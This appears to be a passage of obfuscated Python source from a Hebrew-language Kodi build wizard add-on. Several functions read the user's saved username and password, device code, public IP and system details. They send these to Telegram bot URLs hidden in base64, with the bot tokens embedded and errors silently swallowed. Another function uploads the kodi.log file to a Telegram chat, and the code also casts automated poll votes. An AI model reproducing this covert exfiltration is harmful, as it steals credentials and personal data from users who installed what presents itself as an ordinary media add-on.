          OOOO00O0OO000OO00 =requests .get (O00O0O0OOO000OOOO +que ('ההתקנה לא זמינה כעת, נסו שוב מאוחר יותר :')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOO0O00OO0OOOO0O +que (' סיסמה: ')+OOO0O0OOOOO0O0O0O +que (' קודי: ')+OO0O00OOO000O0000 +que (' כתובת: ')+OO0OOOO0O0OOOOO00 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0O0OOOO0OOOOO00 ).json ()#line:542
       except :pass #line:544
def gomsb_go ():#line:545
       try :#line:546
          import json ,requests #line:547
          wiz .log ('FRESH MESSAGE')#line:548
          O00O0OO000O00O000 =(wiz .getS ("user"))#line:549
          OOO00O0O00O00OOO0 =(wiz .getS ("pass"))#line:550
          O000O00O0O00OO000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:551
          O0000OO0O0000OO0O =platform .uname ()#line:552
          O0O00OO00OOOOO00O =O0000OO0O0000OO0O [1 ]#line:553
          OO0OOO00O00OOOO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:554
          OOOO00O0OO00O00OO =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:555
          O000000OOO0O0O00O =O00O0OO000O00O000 #line:557
          OO00OOOO0O0O0O000 =OOO00O0O00O00OOO0 #line:558
          O000000OO00OO0OOO =requests .get (OO0OOO00O00OOOO00 +que ('ההורדה חסומה: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+O000000OOO0O0O00O +que (' סיסמה: ')+OO00OOOO0O0O0O000 +que (' קודי: ')+O000O00O0O00OO000 +que (' כתובת: ')+OOOO00O0OO00O00OO +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0O00OO00OOOOO00O ).json ()#line:560
       except :pass #line:562
def gomsb_go2 (O000000OOO0O0O000 ):#line:563
       try :#line:564
          import json ,requests #line:565
          wiz .log ('FRESH MESSAGE')#line:566
          O0OOO0OO0OO00O000 =(wiz .getS ("user"))#line:567
          OOOOOO00O0000OOO0 =(wiz .getS ("pass"))#line:568
          OO0OO0OOOO0O0O0O0 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:569
          O000000OOO000000O =platform .uname ()#line:570
          OO0OOOOO00O0O00OO =O000000OOO000000O [1 ]#line:571
          OOO0OO0OOO00OO0OO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE3MDMzMzkxOTg6QUFIZDZrM2VPNmwwMkpJSDZpZF9WZjdKTGg0TGcwelVqdEUvc2VuZE1lc3NhZ2U/Y2hhdF9pZD0tMTAwMTMxMjc0MjI5OSZ0ZXh0PQ==').decode ('utf-8')#line:572
          OOOO0OO00000OOOO0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:573
          OO00OOOOO000OO00O =O0OOO0OO0OO00O000 #line:575
          OO0000O00OOOO0O00 =OOOOOO00O0000OOO0 #line:576
          OOOOO0OO000O00000 =requests .get (OOO0OO0OOO00OO0OO +que ('חסימה על ידי: '+O000000OOO0O0O000 +' -')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OO00OOOOO000OO00O +que (' סיסמה: ')+OO0000O00OOOO0O00 +que (' קודי: ')+OO0OO0OOOO0O0O0O0 +que (' כתובת: ')+OOOO0OO00000OOOO0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+OO0OOOOO00O0O00OO +que (' גירסת ויזארד: ')+VERSION ).json ()#line:578
       except :pass #line:579
def read_firebase_c (O0OOO0000O0OO0000 ):#line:580
    from resources .libs import firebase #line:581
    O00000OO0O000O0O0 =firebase .FirebaseApplication ('https://zxcsd-3bae5-default-rtdb.firebaseio.com',None )#line:582
    O000O00O00OOO0000 =O00000OO0O000O0O0 .get ('/',None )#line:583
    if O0OOO0000O0OO0000 in O000O00O00OOO0000 :#line:584
        return O000O00O00OOO0000 [O0OOO0000O0OO0000 ]#line:585
    else :#line:586
        return {}#line:587
def telecode ():#line:588
    OO000OOOO0OO0OO00 =read_firebase_c ('telecode')#line:589
    OOOOO00O0O000O0O0 =[]#line:590
    for O00OO0OOOOOO0O00O in OO000OOOO0OO0OO00 :#line:591
        O0O00O000OO00OOOO =OO000OOOO0OO0OO00 [O00OO0OOOOOO0O00O ]#line:592
        OOOOO00O0O000O0O0 .append ((O0O00O000OO00OOOO ['pin']))#line:593
    for OO00O00000OOO000O in OOOOO00O0O000O0O0 :#line:594
       return OO00O00000OOO000O #line:595
def check_firebase ():#line:599
     if len (wiz .getS ("sync_user"))>0 and wiz .getS ("pass2")=='true':#line:601
        try :#line:603
            O00000OOOOOOO00OO =read_firebase ('table_name')#line:604
        except :#line:605
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,'Anonymous TV'),'[COLOR %s]שם המשתמש של הסנכרון שגוי[/COLOR]'%COLOR2 )#line:606
            OOO0O0OOOO0OOO0OO =DIALOG .yesno ('בעיה בשם המשתמש של הסנכרון',"שם המשתמש של [B][COLOR red]הסנכרון[/COLOR][/B] אינו נכון,"+'\n'+"הכנס את שם המשתמש כעת.","ביטול",yeslabel ='[B][COLOR yellow]אישור[/COLOR][/B]')#line:608
            if BUILDNAME =="":#line:611
                xbmc .executebuiltin ("ActivateWindow(home)")#line:612
            if OOO0O0OOOO0OOO0OO :#line:613
               ADDON .openSettings ()#line:614
               sys .exit ()#line:615
            else :#line:616
             sys .exit ()#line:617
def indicatorVotes ():#line:619
   try :#line:620
        import requests #line:621
        O0OO0OOOO0O0OO00O ='42244359'#line:622
        OO00OO00O00OOO0OO ={'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0','Accept':'*/*','Accept-Language':'en-US,en;q=0.5','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With':'XMLHttpRequest','Connection':'keep-alive','Referer':'https://www.strawpoll.me/'+O0OO0OOOO0O0OO00O ,'Pragma':'no-cache','Cache-Control':'no-cache','TE':'Trailers',}#line:634
        O0O0O00OOO00O0000 ='247106541'#line:636
        O0O000OOOOOO000OO ={'options':O0O0O00OOO00O0000 }#line:642
        O0OO0OO00O0OO0OO0 =requests .post ('https://www.strawpoll.me/'+O0OO0OOOO0O0OO00O ,headers =OO00OO00O00OOO0OO ,data =O0O000OOOOOO000OO )#line:644
   except :pass #line:645
def autotrakt ():#line:646
    OOO00OOOO0O00000O =(wiz .getS ("auto_trk"))#line:647
    if OOO00OOOO0O00000O =='true':#line:648
       from resources .libs import trk_aut #line:649
def traktsync ():#line:651
     OO0O0O00OO00OOOO0 =(wiz .getS ("auto_trk"))#line:652
     if OO0O0O00OO00OOOO0 =='false':#line:653
       ADDON .openSettings ()#line:654
     from resources .libs import trk_aut #line:655
def imdb_synck ():#line:657
   try :#line:658
     OOOO0000O00OO00OO =xbmcaddon .Addon ('plugin.video.exodusredux')#line:659
     OO00O00OOO00000OO =xbmcaddon .Addon ('plugin.video.gaia')#line:660
     O00O0OO0O0OO0O0O0 =(wiz .getS ("imdb_sync"))#line:661
     O0O0OOO0OO0OOO0O0 ="imdb.user"#line:662
     O000OO0OOOOO00000 ="accounts.informants.imdb.user"#line:663
     OOOO0000O00OO00OO .setSetting (O0O0OOO0OO0OOO0O0 ,str (O00O0OO0O0OO0O0O0 ))#line:664
     OO00O00OOO00000OO .setSetting ('accounts.informants.imdb.enabled','true')#line:665
     OO00O00OOO00000OO .setSetting (O000OO0OOOOO00000 ,str (O00O0OO0O0OO0O0O0 ))#line:666
   except :pass #line:667
def dis_or_enable_addon (O000O0O00OOO0O000 ,O0O0O00O0O0O0000O ,enable ="true"):#line:669
    import json #line:670
    OO0000O0OOO000OO0 ='"%s"'%O000O0O00OOO0O000 #line:671
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O000O0O00OOO0O000 )and enable =="true":#line:672
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O000O0O00OOO0O000 )#line:674
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O000O0O00OOO0O000 )and enable =="false":#line:675
        return xbmc .log ("### Skipped %s, reason = not installed"%O000O0O00OOO0O000 )#line:676
    else :#line:677
        OO0OOOOOOO0OOOOOO ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OO0000O0OOO000OO0 ,enable )#line:678
        O000OOOO00O00O0OO =xbmc .executeJSONRPC (OO0OOOOOOO0OOOOOO )#line:679
        O0OOOOOO0000O0O00 =json .loads (O000OOOO00O00O0OO )#line:680
        if enable =="true":#line:681
            xbmc .log ("### Enabled %s, response = %s"%(O000O0O00OOO0O000 ,O0OOOOOO0000O0O00 ))#line:682
        else :#line:683
            xbmc .log ("### Disabled %s, response = %s"%(O000O0O00OOO0O000 ,O0OOOOOO0000O0O00 ))#line:684
    if O0O0O00O0O0O0000O =='auto':#line:685
     return True #line:686
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:687
def howsentlog ():#line:691
       try :#line:693
          import json ,requests #line:694
          O0000OO000OO0OOO0 =(wiz .getS ("user"))#line:695
          O0000000OO0O00000 =(wiz .getS ("pass"))#line:696
          OOO00OOO0O00OOOOO =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:697
          O0O0O00OO0O00000O =platform .uname ()#line:698
          O0OO0O0O00000OOOO =O0O0O00OO0O00000O [1 ]#line:699
          OO0O0O0O0O0O000OO =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0=').decode ('utf-8')#line:700
          O000OOO000O00O0O0 =requests .get ('https://checkip.amazonaws.com').text .strip ()#line:701
          OOOO0O0O0O00O0OOO =O0000OO000OO0OOO0 #line:703
          OOOOOO0OO000OOOO0 =O0000000OO0O00000 #line:704
          xbmc .getInfoLabel ('System.OSVersionInfo')#line:705
          xbmc .sleep (1500 )#line:706
          O0OOO00O0O00000O0 =xbmc .getInfoLabel ('System.OSVersionInfo')#line:707
          O0OOOO00000OO0O00 =requests .get (OO0O0O0O0O0O000OO +que ('שלח לוג: ')+que (' קוד מכשיר: ')+(HARDWAER )+que (' שם משתמש: ')+OOOO0O0O0O00O0OOO +que (' סיסמה: ')+OOOOOO0OO000OOOO0 +que (' קודי: ')+OOO00OOO0O00OOOOO +que (' כתובת: ')+O000OOO000O00O0O0 +que (' מערכת הפעלה: ')+wiz .platform_d ()+que (' שם המערכת: ')+O0OO0O0O00000OOOO +que (' גירסת ויזארד: ')+VERSION ).json ()#line:710
       except :pass #line:712
def logsend ():#line:714
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]שולח לוג אנא המתן[/COLOR]'%COLOR2 )#line:715
      xbmc .executebuiltin ('ActivateWindow(busydialognocancel)')#line:716
      try :#line:717
          O000OO00OO00OO0OO =xbmcgui .DialogBusy ()#line:718
          O000OO00OO00OO0OO .create ()#line:719
      except :pass #line:720
      if not os .path .exists (translatepath ("special://home/addons/")+'script.module.requests'):#line:721
        xbmc .executebuiltin ("RunPlugin(plugin://script.module.requests)")#line:722
        sys .exit ()#line:723
      howsentlog ()#line:725
      import requests #line:726
      if xbmc .getCondVisibility ('system.platform.windows'):#line:727
         OO00OO000OOO0000O =xbmc .translatePath ('special://home/kodi.log')#line:728
         O0OO0OO000O00OOO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO000OOO0000O ,open (OO00OO000OOO0000O ,'rb')),}#line:732
         O000O000OOOO0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:733
         O0000O00OO0O0O000 =requests .post (O000O000OOOO0OO00 ,files =O0OO0OO000O00OOO0 )#line:735
      elif xbmc .getCondVisibility ('system.platform.android'):#line:736
           OO00OO000OOO0000O =xbmc .translatePath ('special://temp/kodi.log')#line:737
           O0OO0OO000O00OOO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO000OOO0000O ,open (OO00OO000OOO0000O ,'rb')),}#line:741
           O000O000OOOO0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:742
           O0000O00OO0O0O000 =requests .post (O000O000OOOO0OO00 ,files =O0OO0OO000O00OOO0 )#line:744
      else :#line:745
           OO00OO000OOO0000O =xbmc .translatePath ('special://kodi.log')#line:746
           O0OO0OO000O00OOO0 ={'chat_id':(None ,'-274262389'),'document':(OO00OO000OOO0000O ,open (OO00OO000OOO0000O ,'rb')),}#line:750
           O000O000OOOO0OO00 =base64 .b64decode ('aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ=').decode ('utf-8')#line:751
           O0000O00OO0O0O000 =requests .post (O000O000OOOO0OO00 ,files =O0OO0OO000O00OOO0 )#line:753
      xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:754
      wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:755
theme_nox ='https://zxcsd-3bae5-default-rtdb.firebaseio.com'#line:763
black_nox ='https://blacklist-user-default-rtdb.firebaseio.com'#line:765
def parseDOM2 (O0OOO0OO0OO000OOO ,name =u"",attrs ={},ret =False ):#line:767
	if isinstance (O0OOO0OO0OO000OOO ,str ):#line:770
		try :#line:771
			O0OOO0OO0OO000OOO =[O0OOO0OO0OO000OOO .decode ("utf-8")]#line:772
		except :#line:773
			O0OOO0OO0OO000OOO =[O0OOO0OO0OO000OOO ]#line:774
	elif isinstance (O0OOO0OO0OO000OOO ,str ):#line:775
		O0OOO0OO0OO000OOO =[O0OOO0OO0OO000OOO ]#line:776
	elif not isinstance (O0OOO0OO0OO000OOO ,list ):#line:777
		return u""#line:778
	if not name .strip ():#line:780
		return u""#line:781
	OO000000OOOO0000O =[]#line:783
	for OOOO0OO0O0O0OOOOO in O0OOO0OO0OO000OOO :#line:784
		OO0OOO0000OO0000O =re .compile ('(<[^>]*?\n[^>]*?>)').findall (OOOO0OO0O0O0OOOOO )#line:785
		for OO0O00O00O0O0O000 in OO0OOO0000OO0000O :#line:786
			OOOO0OO0O0O0OOOOO =OOOO0OO0O0O0OOOOO .replace (OO0O00O00O0O0O000 ,OO0O00O00O0O0O000 .replace ("\n"," "))#line:787
		OO00OOOO00000000O =[]#line:789
		for O0O000000O0OOOOOO in attrs :#line:790
			O0OOOOO00O0O000O0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O000000O0OOOOOO +'=[\'"]'+attrs [O0O000000O0OOOOOO ]+'[\'"].*?>))',re .M |re .S ).findall (OOOO0OO0O0O0OOOOO )#line:791
			if len (O0OOOOO00O0O000O0 )==0 and attrs [O0O000000O0OOOOOO ].find (" ")==-1 :#line:792
				O0OOOOO00O0O000O0 =re .compile ('(<'+name +'[^>]*?(?:'+O0O000000O0OOOOOO +'='+attrs [O0O000000O0OOOOOO ]+'.*?>))',re .M |re .S ).findall (OOOO0OO0O0O0OOOOO )#line:793
			if len (OO00OOOO00000000O )==0 :#line:795
				OO00OOOO00000000O =O0OOOOO00O0O000O0 #line:796
				O0OOOOO00O0O000O0 =[]#line:797
			else :#line:798
				OO0O00O000OO00OOO =list (range (len (OO00OOOO00000000O )))#line:799
				OO0O00O000OO00OOO .reverse ()#line:800
				for O0OOO0OOO000OO00O in OO0O00O000OO00OOO :#line:801
					if not OO00OOOO00000000O [O0OOO0OOO000OO00O ]in O0OOOOO00O0O000O0 :#line:802
						del (OO00OOOO00000000O [O0OOO0OOO000OO00O ])#line:803
		if len (OO00OOOO00000000O )==0 and attrs =={}:#line:805
			OO00OOOO00000000O =re .compile ('(<'+name +'>)',re .M |re .S ).findall (OOOO0OO0O0O0OOOOO )#line:806
			if len (OO00OOOO00000000O )==0 :#line:807
				OO00OOOO00000000O =re .compile ('(<'+name +' .*?>)',re .M |re .S ).findall (OOOO0OO0O0O0OOOOO )#line:808
		if isinstance (ret ,str ):#line:810
			O0OOOOO00O0O000O0 =[]#line:811
			for OO0O00O00O0O0O000 in OO00OOOO00000000O :#line:812
				O00O0000OO0OO000O =re .compile ('<'+name +'.*?'+ret +'=([\'"].[^>]*?[\'"])>',re .M |re .S ).findall (OO0O00O00O0O0O000 )#line:813
				if len (O00O0000OO0OO000O )==0 :#line:814
					O00O0000OO0OO000O =re .compile ('<'+name +'.*?'+ret +'=(.[^>]*?)>',re .M |re .S ).findall (OO0O00O00O0O0O000 )#line:815
				for O00OOO000OO0OOOO0 in O00O0000OO0OO000O :#line:816
					OO0O0OOO0O0000000 =O00OOO000OO0OOOO0 [0 ]#line:817
					if OO0O0OOO0O0000000 in "'\"":#line:818
						if O00OOO000OO0OOOO0 .find ('='+OO0O0OOO0O0000000 ,O00OOO000OO0OOOO0 .find (OO0O0OOO0O0000000 ,1 ))>-1 :#line:819
							O00OOO000OO0OOOO0 =O00OOO000OO0OOOO0 [:O00OOO000OO0OOOO0 .find ('='+OO0O0OOO0O0000000 ,O00OOO000OO0OOOO0 .find (OO0O0OOO0O0000000 ,1 ))]#line:820
						if O00OOO000OO0OOOO0 .rfind (OO0O0OOO0O0000000 ,1 )>-1 :#line:822
							O00OOO000OO0OOOO0 =O00OOO000OO0OOOO0 [1 :O00OOO000OO0OOOO0 .rfind (OO0O0OOO0O0000000 )]#line:823
					else :#line:824
						if O00OOO000OO0OOOO0 .find (" ")>0 :#line:825
							O00OOO000OO0OOOO0 =O00OOO000OO0OOOO0 [:O00OOO000OO0OOOO0 .find (" ")]#line:826
						elif O00OOO000OO0OOOO0 .find ("/")>0 :#line:827
							O00OOO000OO0OOOO0 =O00OOO000OO0OOOO0 [:O00OOO000OO0OOOO0 .find ("/")]#line:828
						elif O00OOO000OO0OOOO0 .find (">")>0 :#line:829
							O00OOO000OO0OOOO0 =O00OOO000OO0OOOO0 [:O00OOO000OO0OOOO0 .find (">")]#line:830
					O0OOOOO00O0O000O0 .append (O00OOO000OO0OOOO0 .strip ())#line:832
			OO00OOOO00000000O =O0OOOOO00O0O000O0 #line:833
		else :#line:834
			O0OOOOO00O0O000O0 =[]#line:835
			for OO0O00O00O0O0O000 in OO00OOOO00000000O :#line:836
				OO0O0000OO00OOOOO =u"</"+name #line:837
				O00OOO0000000O0O0 =OOOO0OO0O0O0OOOOO .find (OO0O00O00O0O0O000 )#line:839
				O00O0O0OO00OO00O0 =OOOO0OO0O0O0OOOOO .find (OO0O0000OO00OOOOO ,O00OOO0000000O0O0 )#line:840
				OOO00OOOO0OOOOO0O =OOOO0OO0O0O0OOOOO .find ("<"+name ,O00OOO0000000O0O0 +1 )#line:841
				while OOO00OOOO0OOOOO0O <O00O0O0OO00OO00O0 and OOO00OOOO0OOOOO0O !=-1 :#line:843
					O0O0OOO00O0OOO000 =OOOO0OO0O0O0OOOOO .find (OO0O0000OO00OOOOO ,O00O0O0OO00OO00O0 +len (OO0O0000OO00OOOOO ))#line:844
					if O0O0OOO00O0OOO000 !=-1 :#line:845
						O00O0O0OO00OO00O0 =O0O0OOO00O0OOO000 #line:846
					OOO00OOOO0OOOOO0O =OOOO0OO0O0O0OOOOO .find ("<"+name ,OOO00OOOO0OOOOO0O +1 )#line:847
				if O00OOO0000000O0O0 ==-1 and O00O0O0OO00OO00O0 ==-1 :#line:849
					OO0O0O00OOO00000O =u""#line:850
				elif O00OOO0000000O0O0 >-1 and O00O0O0OO00OO00O0 >-1 :#line:851
					OO0O0O00OOO00000O =OOOO0OO0O0O0OOOOO [O00OOO0000000O0O0 +len (OO0O00O00O0O0O000 ):O00O0O0OO00OO00O0 ]#line:852
				elif O00O0O0OO00OO00O0 >-1 :#line:853
					OO0O0O00OOO00000O =OOOO0OO0O0O0OOOOO [:O00O0O0OO00OO00O0 ]#line:854
				elif O00OOO0000000O0O0 >-1 :#line:855
					OO0O0O00OOO00000O =OOOO0OO0O0O0OOOOO [O00OOO0000000O0O0 +len (OO0O00O00O0O0O000 ):]#line:856
				if ret :#line:858
					OO0O0000OO00OOOOO =OOOO0OO0O0O0OOOOO [O00O0O0OO00OO00O0 :OOOO0OO0O0O0OOOOO .find (">",OOOO0OO0O0O0OOOOO .find (OO0O0000OO00OOOOO ))+1 ]#line:859
					OO0O0O00OOO00000O =OO0O00O00O0O0O000 +OO0O0O00OOO00000O +OO0O0000OO00OOOOO #line:860
				OOOO0OO0O0O0OOOOO =OOOO0OO0O0O0OOOOO [OOOO0OO0O0O0OOOOO .find (OO0O0O00OOO00000O ,OOOO0OO0O0O0OOOOO .find (OO0O00O00O0O0O000 ))+len (OO0O0O00OOO00000O ):]#line:862
				O0OOOOO00O0O000O0 .append (OO0O0O00OOO00000O )#line:863
			OO00OOOO00000000O =O0OOOOO00O0O000O0 #line:864
		OO000000OOOO0000O +=OO00OOOO00000000O #line:865
	return OO000000OOOO0000O #line:867
def addItem (OOO00OOO0O0O00OOO ,OOO00O00000OO0OO0 ,O0O0OOO0OO0OO00O0 ,O00OOO00O00OOO000 ,OO0O00OO0OOO00O00 ,description =None ):#line:869
    if description ==None :description =''#line:870
    description ='[COLOR white]'+description +'[/COLOR]'#line:871
    O0OO000OOO00000OO =sys .argv [0 ]+"?url="+que (OOO00O00000OO0OO0 )+"&mode="+str (O0O0OOO0OO0OO00O0 )+"&name="+que (OOO00OOO0O0O00OOO )+"&iconimage="+que (O00OOO00O00OOO000 )+"&fanart="+que (OO0O00OO0OOO00O00 )#line:872
    O0000O0OOOOO0000O =True #line:873
    try :#line:874
        O00OO000OO00OO000 =xbmcgui .ListItem (OOO00OOO0O0O00OOO ,iconImage =O00OOO00O00OOO000 ,thumbnailImage =O00OOO00O00OOO000 )#line:875
    except :#line:876
        O00OO000OO00OO000 =xbmcgui .ListItem (OOO00OOO0O0O00OOO )#line:877
        O00OO000OO00OO000 .setArt ({'thumb':O00OOO00O00OOO000 ,'fanart':O00OOO00O00OOO000 ,'DefaultFolder.png':O00OOO00O00OOO000 })#line:878
    O00OO000OO00OO000 .setInfo (type ="Video",infoLabels ={"Title":OOO00OOO0O0O00OOO ,"Plot":description })#line:879
    O00OO000OO00OO000 .setProperty ("fanart_Image",OO0O00OO0OOO00O00 )#line:880
    O00OO000OO00OO000 .setProperty ("icon_Image",O00OOO00O00OOO000 )#line:881
    O0000O0OOOOO0000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OO000OOO00000OO ,listitem =O00OO000OO00OO000 ,isFolder =False )#line:882
    return O0000O0OOOOO0000O #line:883
def decode (O0O0OOO000O0O0O00 ,O00O000O0O000OO00 ):#line:906
    import base64 #line:907
    O000OO0OO0OOOO0O0 =[]#line:908
    if (len (O0O0OOO000O0O0O00 ))!=4 :#line:910
     return 10 #line:911
    O00O000O0O000OO00 =base64 .urlsafe_b64decode (O00O000O0O000OO00 )#line:912
    for OOOOO0O0O0O00O0OO in range (len (O00O000O0O000OO00 )):#line:914
        O0O000OOOOOO00OOO =O0O0OOO000O0O0O00 [OOOOO0O0O0O00O0OO %len (O0O0OOO000O0O0O00 )]#line:915
        try :#line:916
          O0O0O0O0O0000OOO0 =chr ((256 +ord (O00O000O0O000OO00 [OOOOO0O0O0O00O0OO ])-ord (O0O000OOOOOO00OOO ))%256 )#line:917
        except :#line:918
          O0O0O0O0O0000OOO0 =chr ((256 +(O00O000O0O000OO00 [OOOOO0O0O0O00O0OO ])-ord (O0O000OOOOOO00OOO ))%256 )#line:919
        O000OO0OO0OOOO0O0 .append (O0O0O0O0O0000OOO0 )#line:920
    return "".join (O000OO0OO0OOOO0O0 )#line:921
def tmdb_list (OOOOOO0O0OO0OO0OO ):#line:922
    O00000OOOOO0O0OO0 =decode ("7643",OOOOOO0O0OO0OO0OO )#line:925
    return int (O00000OOOOO0O0OO0 )#line:928
def u_list (OOO000O00O0OOOOO0 ,refresh ='false'):#line:929
    OO0OOO0O0O00OOO00 =wiz .getS ("pass")#line:931
    if not len (ADDON .getSetting ("pass"))>0 :#line:932
        O0O0OOOOOO0OO0O0O =xbmc .Keyboard (OO0OOO0O0O00OOO00 ,'הכנס סיסמה')#line:933
        O0O0OOOOOO0OO0O0O .doModal ()#line:934
        if O0O0OOOOOO0OO0O0O .isConfirmed ():#line:935
            OO0OOO0O0O00OOO00 =O0O0OOOOOO0OO0O0O .getText ()#line:936
            wiz .setS ("pass",OO0OOO0O0O00OOO00 )#line:937
        if OO0OOO0O0O00OOO00 =='':#line:938
            sys .exit ()#line:939
    O00OOOOOOO0OOO000 =OO0OOO0O0O00OOO00 #line:940
    if xbmc .getCondVisibility ('system.platform.windows')or xbmc .getCondVisibility ('system.platform.android'):#line:942
        from math import sqrt #line:944
        OOO00OO00OOOO0O00 =tmdb_list (TMDB_NEW_API )#line:945
        try :#line:946
            OO0OO0000O000OO0O =str ((getHwAddr ('eth0'))*OOO00OO00OOOO0O00 )#line:947
            O0000000OO00O0O0O =int (OO0OO0000O000OO0O [1 ]+OO0OO0000O000OO0O [2 ]+OO0OO0000O000OO0O [5 ]+OO0OO0000O000OO0O [7 ])#line:948
            O0OO00OOOO0OO0000 =(str (round (sqrt ((O0000000OO00O0O0O *500 )+30 )+30 ,4 ))[-4 :]).replace ('.','')#line:949
            if '.'in O0OO00OOOO0OO0000 :#line:951
             O0OO00OOOO0OO0000 =(str (round (sqrt ((O0000000OO00O0O0O *500 )+30 )+30 ,4 ))[-5 :]).replace ('.','')#line:952
        except :#line:953
         O0000000OO00O0O0O =''#line:954
         O0OO00OOOO0OO0000 =''#line:955
        if O00OOOOOOO0OOO000 ==O0OO00OOOO0OO0000 :#line:956
            if refresh =='true':#line:957
                xbmc .executebuiltin ('Container.Refresh')#line:959
            OO0O000O0OOOOOOO0 =OOO000O00O0OOOOO0 #line:960
            return OO0O000O0OOOOOOO0 ,O0000000OO00O0O0O #line:961
        elif wiz .STARTP2 ()=='ok':#line:963
             if refresh =='true':#line:965
                xbmc .executebuiltin ('Container.Refresh')#line:966
             return OOO000O00O0OOOOO0 #line:968
        else :#line:969
            wiz .setS ("pass",'')#line:970
            wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]סיסמה שגויה[/COLOR]"%COLOR2 )#line:971
            xbmc .executebuiltin ('Dialog.Close(busydialognocancel)')#line:972
            xbmc .executebuiltin ('Container.Refresh')#line:973
            sys .exit ()#line:974
        return 'ok',O0000000OO00O0O0O #line:975
    else :#line:977
           if wiz .STARTP2 ()=='ok':#line:978
             return OOO000O00O0OOOOO0 #line:980
def disply_hwr ():#line:982
   try :#line:983
    OOO0000OOOO0OOO00 =tmdb_list (TMDB_NEW_API )#line:984
    OOOO000O000OOO0OO =str ((getHwAddr ('eth0'))*OOO0000OOOO0OOO00 )#line:985
    O0O0O00O00OOO0OOO =(OOOO000O000OOO0OO [1 ]+OOOO000O000OOO0OO [2 ]+OOOO000O000OOO0OO [5 ]+OOOO000O000OOO0OO [7 ])#line:992
    OOO0O0OOOOOO0O0OO =(wiz .getS ("action"))#line:993
    wiz .setS ('action',str (O0O0O00O00OOO0OOO ))#line:995
   except :pass #line:996
def disply_hwr2 ():#line:997
   try :#line:998
    OOOOOOOO00O000000 =tmdb_list (TMDB_NEW_API )#line:999
    OOO0O0000O0OOOO00 =str ((getHwAddr ('eth0'))*OOOOOOOO00O000000 )#line:1001
    O00O00OO00O0OOO0O =(OOO0O0000O0OOOO00 [1 ]+OOO0O0000O0OOOO00 [2 ]+OOO0O0000O0OOOO00 [5 ]+OOO0O0000O0OOOO00 [7 ])#line:1010
    O0000O0O0O0OO0000 =(wiz .getS ("action"))#line:1011
    xbmcgui .Dialog ().ok ("[COLOR yellow] לשלוח את הקוד למנהלים [/COLOR]",O00O00OO00O0OOO0O )#line:1014
   except :pass #line:1015
def getHwAddr (O00O00O00OO000000 ):#line:1017
   import subprocess ,time #line:1018
   if xbmc .getCondVisibility ('system.platform.android'):#line:1019
     O0OOO0OOOO0O0OOO0 =subprocess .Popen (["exec ''ip link''"],executable ='/system/bin/sh',shell =True ,stdout =subprocess .PIPE ,stderr =subprocess .STDOUT ).communicate ()[0 ].splitlines ()#line:1020
     O0OO0OO00OO000OO0 =re .compile ('link/ether (.+?) brd').findall (str (O0OOO0OOOO0O0OOO0 ))#line:1021
     OOOOOOO0OO0O0O000 =0 #line:1022
     for OOO000000O0O0O00O in O0OO0OO00OO000OO0 :#line:1023
      if O0OO0OO00OO000OO0 !='00:00:00:00:00:00':#line:1024
          O000O0O0OOOO00OOO =OOO000000O0O0O00O #line:1025
